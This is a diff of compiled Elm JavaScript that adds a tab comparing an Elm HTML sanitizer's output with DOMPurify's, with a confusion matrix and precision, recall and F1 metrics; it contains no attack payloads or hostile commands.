+								$elm$core$String$isEmpty(row.dpOutput) ? '(empty)' : A2($author$project$Main$truncate, 45, row.dpOutput))
+							]))
+					])),
+				A2(
+				$elm$html$Html$td,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'padding', '5px 10px'),
+						A2($elm$html$Html$Attributes$style, 'text-align', 'center')
+					]),
+				_List_fromArray(
+					[
+						matches ? A2(
+						$elm$html$Html$span,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'color', '#16a34a'),
+								A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+								A2($elm$html$Html$Attributes$style, 'font-size', '1rem')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text('=')
+							])) : A2(
+						$elm$html$Html$span,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'color', '#d97706'),
+								A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+								A2($elm$html$Html$Attributes$style, 'font-size', '1rem')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text('≠')
+							]))
+					]))
+			]));
+};
+var $author$project$Main$computePrecision = function (m) {
+	return (!(m.tp + m.fp)) ? $elm$core$Maybe$Nothing : $elm$core$Maybe$Just(m.tp / (m.tp + m.fp));
+};
+var $author$project$Main$computeRecall = function (m) {
+	return (!(m.tp + m.fn)) ? $elm$core$Maybe$Nothing : $elm$core$Maybe$Just(m.tp / (m.tp + m.fn));
+};
+var $author$project$Main$computeF1 = function (m) {
+	var _v0 = _Utils_Tuple2(
+		$author$project$Main$computePrecision(m),
+		$author$project$Main$computeRecall(m));
+	if ((_v0.a.$ === 'Just') && (_v0.b.$ === 'Just')) {
+		var p = _v0.a.a;
+		var r = _v0.b.a;
+		return (!(p + r)) ? $elm$core$Maybe$Nothing : $elm$core$Maybe$Just(((2 * p) * r) / (p + r));
+	} else {
+		return $elm$core$Maybe$Nothing;
+	}
+};
+var $elm$core$Basics$round = _Basics_round;
+var $author$project$Main$formatPct = function (mf) {
+	if (mf.$ === 'Nothing') {
+		return 'N/A';
+	} else {
+		var f = mf.a;
+		var pct = f * 100;
+		var intPart = $elm$core$Basics$floor(pct);
+		var frac = $elm$core$Basics$round((pct - intPart) * 10);
+		return $elm$core$String$fromInt(intPart) + ('.' + ($elm$core$String$fromInt(frac) + '%'));
+	}
+};
+var $author$project$Main$viewConfusionMatrix = function (m) {
+	return A2(
+		$elm$html$Html$div,
+		_List_Nil,
+		_List_fromArray(
+			[
+				A2(
+				$elm$html$Html$div,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'font-size', '0.78rem'),
+						A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+						A2($elm$html$Html$Attributes$style, 'color', '#444'),
+						A2($elm$html$Html$Attributes$style, 'margin-bottom', '6px')
+					]),
+				_List_fromArray(
+					[
+						$elm$html$Html$text('Confusion matrix')
+					])),
+				A2(
+				$elm$html$Html$table,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'border-collapse', 'collapse'),
+						A2($elm$html$Html$Attributes$style, 'font-size', '0.8rem')
+					]),
+				_List_fromArray(
+					[
+						A2(
+						$elm$html$Html$thead,
+						_List_Nil,
+						_List_fromArray(
+							[
+								A2(
+								$elm$html$Html$tr,
+								_List_Nil,
+								_List_fromArray(
+									[
+										A2(
+										$elm$html$Html$th,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '5px 12px'),
+												A2($elm$html$Html$Attributes$style, 'background', '#eee'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc')
+											]),
+										_List_fromArray(
+											[
+												$elm$html$Html$text('')
+											])),
+										A2(
+										$elm$html$Html$th,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '5px 12px'),
+												A2($elm$html$Html$Attributes$style, 'background', '#eee'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'color', '#555'),
+												A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap')
+											]),
+										_List_fromArray(
+											[
+												$elm$html$Html$text('outputs match')
+											])),
+										A2(
+										$elm$html$Html$th,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '5px 12px'),
+												A2($elm$html$Html$Attributes$style, 'background', '#eee'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'color', '#555'),
+												A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap')
+											]),
+										_List_fromArray(
+											[
+												$elm$html$Html$text('outputs differ')
+											]))
+									]))
+							])),
+						A2(
+						$elm$html$Html$tbody,
+						_List_Nil,
+						_List_fromArray(
+							[
+								A2(
+								$elm$html$Html$tr,
+								_List_Nil,
+								_List_fromArray(
+									[
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 12px'),
+												A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+												A2($elm$html$Html$Attributes$style, 'background', '#eee'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+												A2($elm$html$Html$Attributes$style, 'color', '#555')
+											]),
+										_List_fromArray(
+											[
+												$elm$html$Html$text('Elm blocked')
+											])),
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 20px'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'background', '#dcfce7')
+											]),
+										_List_fromArray(
+											[
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+														A2($elm$html$Html$Attributes$style, 'font-size', '1.1rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#16a34a')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text(
+														$elm$core$String$fromInt(m.tp))
+													])),
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-size', '0.68rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#6b7280')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text('TP')
+													]))
+											])),
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 20px'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'background', '#fee2e2')
+											]),
+										_List_fromArray(
+											[
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+														A2($elm$html$Html$Attributes$style, 'font-size', '1.1rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#dc2626')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text(
+														$elm$core$String$fromInt(m.fp))
+													])),
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-size', '0.68rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#6b7280')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text('FP')
+													]))
+											]))
+									])),
+								A2(
+								$elm$html$Html$tr,
+								_List_Nil,
+								_List_fromArray(
+									[
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 12px'),
+												A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+												A2($elm$html$Html$Attributes$style, 'background', '#eee'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'white-space', 'nowrap'),
+												A2($elm$html$Html$Attributes$style, 'color', '#555')
+											]),
+										_List_fromArray(
+											[
+												$elm$html$Html$text('Elm passed')
+											])),
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 20px'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'background', '#dcfce7')
+											]),
+										_List_fromArray(
+											[
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+														A2($elm$html$Html$Attributes$style, 'font-size', '1.1rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#16a34a')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text(
+														$elm$core$String$fromInt(m.tn))
+													])),
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-size', '0.68rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#6b7280')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text('TN')
+													]))
+											])),
+										A2(
+										$elm$html$Html$td,
+										_List_fromArray(
+											[
+												A2($elm$html$Html$Attributes$style, 'padding', '7px 20px'),
+												A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+												A2($elm$html$Html$Attributes$style, 'border', '1px solid #ccc'),
+												A2($elm$html$Html$Attributes$style, 'background', '#fef9c3')
+											]),
+										_List_fromArray(
+											[
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+														A2($elm$html$Html$Attributes$style, 'font-size', '1.1rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#d97706')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text(
+														$elm$core$String$fromInt(m.fn))
+													])),
+												A2(
+												$elm$html$Html$div,
+												_List_fromArray(
+													[
+														A2($elm$html$Html$Attributes$style, 'font-size', '0.68rem'),
+														A2($elm$html$Html$Attributes$style, 'color', '#6b7280')
+													]),
+												_List_fromArray(
+													[
+														$elm$html$Html$text('FN')
+													]))
+											]))
+									]))
+							]))
+					]))
+			]));
+};
+var $author$project$Main$viewMetricCard = F4(
+	function (name, value, formula, description) {
+		return A2(
+			$elm$html$Html$div,
+			_List_fromArray(
+				[
+					A2($elm$html$Html$Attributes$style, 'border', '1px solid #e0e0e0'),
+					A2($elm$html$Html$Attributes$style, 'border-radius', '8px'),
+					A2($elm$html$Html$Attributes$style, 'padding', '10px 14px'),
+					A2($elm$html$Html$Attributes$style, 'min-width', '100px'),
+					A2($elm$html$Html$Attributes$style, 'background', 'white')
+				]),
+			_List_fromArray(
+				[
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'font-size', '0.74rem'),
+							A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+							A2($elm$html$Html$Attributes$style, 'color', '#666'),
+							A2($elm$html$Html$Attributes$style, 'margin-bottom', '2px')
+						]),
+					_List_fromArray(
+						[
+							$elm$html$Html$text(name)
+						])),
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'font-size', '1.5rem'),
+							A2($elm$html$Html$Attributes$style, 'font-weight', '700'),
+							A2($elm$html$Html$Attributes$style, 'color', '#1a1a1a'),
+							A2($elm$html$Html$Attributes$style, 'line-height', '1.2')
+						]),
+					_List_fromArray(
+						[
+							$elm$html$Html$text(value)
+						])),
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'font-size', '0.68rem'),
+							A2($elm$html$Html$Attributes$style, 'color', '#888'),
+							A2($elm$html$Html$Attributes$style, 'margin-top', '3px'),
+							A2($elm$html$Html$Attributes$style, 'font-family', 'monospace')
+						]),
+					_List_fromArray(
+						[
+							$elm$html$Html$text(formula)
+						])),
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'font-size', '0.7rem'),
+							A2($elm$html$Html$Attributes$style, 'color', '#999'),
+							A2($elm$html$Html$Attributes$style, 'margin-top', '4px'),
+							A2($elm$html$Html$Attributes$style, 'max-width', '120px'),
+							A2($elm$html$Html$Attributes$style, 'line-height', '1.3')
+						]),
+					_List_fromArray(
+						[
+							$elm$html$Html$text(description)
+						]))
+				]));
+	});
+var $author$project$Main$viewMetricsPanel = function (m) {
+	var rec = $author$project$Main$computeRecall(m);
+	var prec = $author$project$Main$computePrecision(m);
+	var f1 = $author$project$Main$computeF1(m);
+	return A2(
+		$elm$html$Html$div,
+		_List_fromArray(
+			[
+				A2($elm$html$Html$Attributes$style, 'display', 'flex'),
+				A2($elm$html$Html$Attributes$style, 'gap', '20px'),
+				A2($elm$html$Html$Attributes$style, 'flex-wrap', 'wrap'),
+				A2($elm$html$Html$Attributes$style, 'align-items', 'flex-start'),
+				A2($elm$html$Html$Attributes$style, 'padding', '14px'),
+				A2($elm$html$Html$Attributes$style, 'background', '#f8f9fa'),
+				A2($elm$html$Html$Attributes$style, 'border', '1px solid #e0e0e0'),
+				A2($elm$html$Html$Attributes$style, 'border-radius', '8px')
+			]),
+		_List_fromArray(
+			[
+				$author$project$Main$viewConfusionMatrix(m),
+				A2(
+				$elm$html$Html$div,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'display', 'flex'),
+						A2($elm$html$Html$Attributes$style, 'flex-direction', 'column'),
+						A2($elm$html$Html$Attributes$style, 'gap', '8px'),
+						A2($elm$html$Html$Attributes$style, 'justify-content', 'flex-start')
+					]),
+				_List_fromArray(
+					[
+						A2(
+						$elm$html$Html$div,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'font-size', '0.78rem'),
+								A2($elm$html$Html$Attributes$style, 'font-weight', '600'),
+								A2($elm$html$Html$Attributes$style, 'color', '#444'),
+								A2($elm$html$Html$Attributes$style, 'margin-bottom', '2px')
+							]),
+						_List_fromArray(
+							[
+								$elm$html$Html$text('Metrics (DOMPurify = ground truth)')
+							])),
+						A2(
+						$elm$html$Html$div,
+						_List_fromArray(
+							[
+								A2($elm$html$Html$Attributes$style, 'display', 'flex'),
+								A2($elm$html$Html$Attributes$style, 'gap', '10px'),
+								A2($elm$html$Html$Attributes$style, 'flex-wrap', 'wrap')
+							]),
+						_List_fromArray(
+							[
+								A4(
+								$author$project$Main$viewMetricCard,
+								'Precision',
+								$author$project$Main$formatPct(prec),
+								'TP / (TP+FP)',
+								'Of Elm\'s blocks, what fraction produced the exact same output as DOMPurify.'),
+								A4(
+								$author$project$Main$viewMetricCard,
+								'Recall',
+								$author$project$Main$formatPct(rec),
+								'TP / (TP+FN)',
+								'Of cases where outputs differed, what fraction did Elm block with matching output.'),
+								A4(
+								$author$project$Main$viewMetricCard,
+								'F1 Score',
+								$author$project$Main$formatPct(f1),
+								'2·P·R / (P+R)',
+								'Harmonic mean of precision and recall.')
+							]))
+					]))
+			]));
+};
+var $author$project$Main$viewComparisonSection = F4(
+	function (title, color, note, rows) {
+		var total = $elm$core$List$length(rows);
+		var matrix = $author$project$Main$computeMatrix(rows);
+		var matchCount = $elm$core$List$length(
+			A2(
+				$elm$core$List$filter,
+				function (r) {
+					return _Utils_eq(r.elmOutput, r.dpOutput);
+				},
+				rows));
+		var divergeCount = total - matchCount;
+		return A2(
+			$elm$html$Html$div,
+			_List_fromArray(
+				[
+					A2($elm$html$Html$Attributes$style, 'margin-bottom', '40px')
+				]),
+			_List_fromArray(
+				[
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'display', 'flex'),
+							A2($elm$html$Html$Attributes$style, 'align-items', 'center'),
+							A2($elm$html$Html$Attributes$style, 'flex-wrap', 'wrap'),
+							A2($elm$html$Html$Attributes$style, 'gap', '10px'),
+							A2($elm$html$Html$Attributes$style, 'margin-bottom', '6px')
+						]),
+					_List_fromArray(
+						[
+							A2(
+							$elm$html$Html$h3,
+							_List_fromArray(
+								[
+									A2($elm$html$Html$Attributes$style, 'margin', '0'),
+									A2($elm$html$Html$Attributes$style, 'font-size', '0.95rem'),
+									A2($elm$html$Html$Attributes$style, 'color', color)
+								]),
+							_List_fromArray(
+								[
+									$elm$html$Html$text(title)
+								])),
+							A2(
+							$author$project$Main$badge,
+							$elm$core$String$fromInt(matchCount) + ' match',
+							'#16a34a'),
+							A2(
+							$author$project$Main$badge,
+							$elm$core$String$fromInt(divergeCount) + ' diverge',
+							(!divergeCount) ? '#9ca3af' : '#d97706')
+						])),
+					A2(
+					$elm$html$Html$p,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'font-size', '0.8rem'),
+							A2($elm$html$Html$Attributes$style, 'color', '#666'),
+							A2($elm$html$Html$Attributes$style, 'margin', '0 0 14px')
+						]),
+					_List_fromArray(
+						[
+							$elm$html$Html$text(note)
+						])),
+					$author$project$Main$viewMetricsPanel(matrix),
+					A2(
+					$elm$html$Html$div,
+					_List_fromArray(
+						[
+							A2($elm$html$Html$Attributes$style, 'overflow-x', 'auto'),
+							A2($elm$html$Html$Attributes$style, 'margin-top', '16px')
+						]),
+					_List_fromArray(
+						[
+							A2(
+							$elm$html$Html$table,
+							_List_fromArray(
+								[
+									A2($elm$html$Html$Attributes$style, 'width', '100%'),
+									A2($elm$html$Html$Attributes$style, 'border-collapse', 'collapse'),
+									A2($elm$html$Html$Attributes$style, 'font-size', '0.78rem')
+								]),
+							_List_fromArray(
+								[
+									A2(
+									$elm$html$Html$thead,
+									_List_Nil,
+									_List_fromArray(
+										[
+											A2(
+											$elm$html$Html$tr,
+											_List_fromArray(
+												[
+													A2($elm$html$Html$Attributes$style, 'background', '#f8f9fa')
+												]),
+											_List_fromArray(
+												[
+													A2(
+													$elm$html$Html$th,
+													A2($author$project$Main$thStyle, '120px', 'left'),
+													_List_fromArray(
+														[
+															$elm$html$Html$text('Category')
+														])),
+													A2(
+													$elm$html$Html$th,
+													A2($author$project$Main$thStyle, '220px', 'left'),
+													_List_fromArray(
+														[
+															$elm$html$Html$text('Input')
+														])),
+													A2(
+													$elm$html$Html$th,
+													A2($author$project$Main$thStyle, '220px', 'left'),
+													_List_fromArray(
+														[
+															$elm$html$Html$text('Elm output')
+														])),
+													A2(
+													$elm$html$Html$th,
+													A2($author$project$Main$thStyle, '220px', 'left'),
+													_List_fromArray(
+														[
+															$elm$html$Html$text('DOMPurify output')
+														])),
+													A2(
+													$elm$html$Html$th,
+													A2($author$project$Main$thStyle, '52px', 'center'),
+													_List_fromArray(
+														[
+															$elm$html$Html$text('Match')
+														]))
+												]))
+										])),
+									A2(
+									$elm$html$Html$tbody,
+									_List_Nil,
+									A2($elm$core$List$map, $author$project$Main$viewComparisonRow, rows))
+								]))
+						]))
+				]));
+	});
+var $author$project$Main$viewComparison = function (model) {
+	return model.comparisonPending ? A2(
+		$elm$html$Html$div,
+		_List_fromArray(
+			[
+				A2($elm$html$Html$Attributes$style, 'padding', '48px'),
+				A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+				A2($elm$html$Html$Attributes$style, 'color', '#555')
+			]),
+		_List_fromArray(
+			[
+				A2(
+				$elm$html$Html$div,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'font-size', '1rem'),
+						A2($elm$html$Html$Attributes$style, 'margin-bottom', '8px')
+					]),
+				_List_fromArray(
+					[
+						$elm$html$Html$text('Running DOMPurify comparison…')
+					])),
+				A2(
+				$elm$html$Html$div,
+				_List_fromArray(
+					[
+						A2($elm$html$Html$Attributes$style, 'font-size', '0.85rem'),
+						A2($elm$html$Html$Attributes$style, 'color', '#888')
+					]),
+				_List_fromArray(
+					[
+						$elm$html$Html$text('Waiting for JavaScript port response.')
+					]))
+			])) : ($elm$core$List$isEmpty(model.comparisonResults) ? A2(
+		$elm$html$Html$div,
+		_List_fromArray(
+			[
+				A2($elm$html$Html$Attributes$style, 'padding', '48px'),
+				A2($elm$html$Html$Attributes$style, 'text-align', 'center'),
+				A2($elm$html$Html$Attributes$style, 'color', '#888')
+			]),
+		_List_fromArray(
+			[
+				$elm$html$Html$text('Switch to this tab to run the comparison.')
+			])) : A2(
+		$elm$html$Html$div,
+		_List_Nil,
+		_List_fromArray(
+			[
+				$author$project$Main$viewComparisonNote,
+				A4(
+				$author$project$Main$viewComparisonSection,
+				'AllowTextOnly  vs  DOMPurify { ALLOWED_TAGS: [] }',
+				'#dc2626',
+				'Note: Elm HTML-escapes the remaining text (safe for innerHTML). DOMPurify returns plain text (safe for textContent). Differences in output format are expected even when both sanitizers neutralize the same threat.',
+				A2(
+					$elm$core$List$map,
+					function (r) {
+						return {category: r.category, dpOutput: r.dpTextOnly, elmOutput: r.elmTextOnly, input: r.input};
+					},
+					model.comparisonResults)),
+				A4(
+				$author$project$Main$viewComparisonSection,
+				'AllowSafeHtml  vs  DOMPurify default config',
+				'#d97706',
+				'Both aim to preserve safe HTML while stripping dangerous constructs. Divergences here reveal genuine policy gaps — payloads that one library blocks and the other passes.',
+				A2(
+					$elm$core$List$map,
+					function (r) {
+						return {category: r.category, dpOutput: r.dpSafeHtml, elmOutput: r.elmSafeHtml, input: r.input};
+					},
+					model.comparisonResults))
+			])));
+};
 var $author$project$Main$SendPassThrough = {$: 'SendPassThrough'};
 var $author$project$Main$SendPlainText = {$: 'SendPlainText'};
 var $author$project$Main$SendRichText = {$: 'SendRichText'};
@@ -6072,12 +7349,10 @@ var $elm$html$Html$Events$stopPropagationOn = F2(
 			event,
 			$elm$virtual_dom$VirtualDom$MayStopPropagation(decoder));
 	});
-var $elm$json$Json$Decode$field = _Json_decodeField;
 var $elm$json$Json$Decode$at = F2(
 	function (fields, decoder) {
 		return A3($elm$core$List$foldr, $elm$json$Json$Decode$field, decoder, fields);
 	});
-var $elm$json$Json$Decode$string = _Json_decodeString;
 var $elm$html$Html$Events$targetValue = A2(
 	$elm$json$Json$Decode$at,
 	_List_fromArray(
@@ -6121,8 +7396,6 @@ var $author$project$Main$demoInput = F3(
 				]),
 			_List_Nil);
 	});
-var $elm$html$Html$h3 = _VirtualDom_node('h3');
-var $elm$html$Html$span = _VirtualDom_node('span');
 var $author$project$Main$policyCard = F5(
 	function (number, policyName, color, description, children) {
 		return A2(
@@ -6248,24 +7521,6 @@ var $author$project$Main$viewDemo = function (model) {
 					]))
 			]));
 };
-var $author$project$Main$badge = F2(
-	function (label, color) {
-		return A2(
-			$elm$html$Html$span,
-			_List_fromArray(
-				[
-					A2($elm$html$Html$Attributes$style, 'background', color),
-					A2($elm$html$Html$Attributes$style, 'color', 'white'),
-					A2($elm$html$Html$Attributes$style, 'padding', '2px 10px'),
-					A2($elm$html$Html$Attributes$style, 'border-radius', '99px'),
-					A2($elm$html$Html$Attributes$style, 'font-size', '0.8rem'),
-					A2($elm$html$Html$Attributes$style, 'font-weight', '600')
-				]),
-			_List_fromArray(
-				[
-					$elm$html$Html$text(label)
-				]));
-	});
 var $elm$core$Basics$composeL = F3(
 	function (g, f, x) {
 		return g(
@@ -6281,12 +7536,6 @@ var $author$project$Tests$passCount = A2(
 var $author$project$Tests$failCount = function (results) {
 	return $elm$core$List$length(results) - $author$project$Tests$passCount(results);
 };
-var $author$project$Main$truncate = F2(
-	function (maxLen, s) {
-		return (_Utils_cmp(
-			$elm$core$String$length(s),
-			maxLen) > 0) ? (A2($elm$core$String$left, maxLen, s) + '…') : s;
-	});
 var $author$project$Main$codeSnippet = F2(
 	function (label, content) {
 		return A2(
@@ -6640,14 +7889,18 @@ var $author$project$Main$view = function (model) {
 				_List_fromArray(
 					[
 						A3($author$project$Main$tabButton, $author$project$Main$DemoTab, 'Interactive Demo', model.activeTab),
-						A3($author$project$Main$tabButton, $author$project$Main$TestsTab, 'Test Suite', model.activeTab)
+						A3($author$project$Main$tabButton, $author$project$Main$TestsTab, 'Test Suite', model.activeTab),
+						A3($author$project$Main$tabButton, $author$project$Main$ComparisonTab, 'Comparison', model.activeTab)
 					])),
 				function () {
 				var _v0 = model.activeTab;
-				if (_v0.$ === 'DemoTab') {
-					return $author$project$Main$viewDemo(model);
-				} else {
-					return $author$project$Main$viewTests($author$project$Tests$runAllTests);
+				switch (_v0.$) {
+					case 'DemoTab':
+						return $author$project$Main$viewDemo(model);
+					case 'TestsTab':
+						return $author$project$Main$viewTests($author$project$Tests$runAllTests);
+					default:
+						return $author$project$Main$viewComparison(model);
 				}
 			}()
 			]));
